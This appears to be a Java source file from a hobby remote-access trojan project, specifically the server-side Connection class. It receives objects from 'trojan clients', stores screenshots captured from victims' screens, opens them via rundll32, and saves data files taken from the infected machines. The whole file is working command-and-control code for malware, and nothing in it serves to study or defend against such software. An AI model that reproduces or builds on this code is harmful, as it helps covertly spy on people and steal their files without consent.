import java.io.*;
import java.net.Socket;
import java.security.Timestamp;
import java.text.SimpleDateFormat;

/**
 * Created by pontu on 2018-02-19.
 */
/*
Class that is just constantly waiting for
replies from the trojan clients.
 */
public class Connection extends Thread {
    private boolean alive = true;
    private boolean active = true;
    private Socket socket;
    private ObjectInputStream ois;
    private ObjectOutputStream oos;
    private TrojanHorse th;

    /*
    Standard constructor.
    starts the objectOutputStreams.
     */
    Connection(Socket skt, TrojanHorse trojan) {
        socket = skt;
        th = trojan;
        System.out.println("\nConnection Established");
        try {
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
        }catch(Exception e) {
            e.printStackTrace();
        }
        start();
    }

    /*
    Run method that is just constantly waiting for replies from the trojans client.
    if a reply is received the handleReply() method is called.
     */
    public void run() {
        Storage storage;
        while(alive) {
            while(active) {
                try {
                    Thread.sleep(100);
                    while((storage = (Storage) ois.readObject()) != null) {
                        System.out.println("Recieved: " + storage + " from client");
                        handleReply(storage);
                    }
                }catch(Exception e) {
                    System.out.println("Connection lost");
                }
                try {
                    active = false;
                    alive = false;
                    socket.close();
                    th.killThread(this);
                }catch(Exception e) {
                    e.printStackTrace();
                }
            }
        }
        try {
            Thread.sleep(25);
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method that checks the data and then calls the handleData() method.
     */
    private void handleReply(Storage storage) {
        if(storage.getData() != null) {
            System.out.println(storage.getCommand() + " has been retrieved!");
            handleData(storage);
        }else if(storage.getCommand() != null) {
            System.out.print(storage.getCommand());
        }else{
            System.out.println("Empty reply");
        }
    }

    /*
    Method used to save a screen shot received from client or to call the saveData() if a datafile
    has been received.
     */
    private void handleData(Storage storage) {
        if(storage.getCommand().equals("screenshot")) {
            String screenshotName = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()) + ".png";
            storage.setCommand(screenshotName);
            saveData(storage);
            try {
                Process p = Runtime.getRuntime().exec("rundll32 SHELL32.DLL,ShellExec_RunDLL " + new File(screenshotName).getAbsolutePath());
                p.waitFor();
            }catch(Exception e) {
                e.printStackTrace();
            }
        }else{
            saveData(storage);
        }
    }

    /*
    Method to save data file received from a client
     */
    private void saveData(Storage storage) {
        try {
            FileOutputStream fos = new FileOutputStream(storage.getCommand());
            fos.write(storage.getData());
            fos.close();
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    /*
    Method used to get the object output stream.
     */
    public ObjectOutputStream getOos() {
        return oos;
    }
    /*
    Method used to get the socket.
     */
    public Socket getSocket() {
        return socket;
    }
    /*
    Method used to set the alive status of the thread.
     */
    public void setAlive(boolean a) {
        active = a;
        alive = a;
    }
    /*
    Method used to set the active status of the thread.
     */
    public void setActive(boolean a) {
        active = a;
    }
}
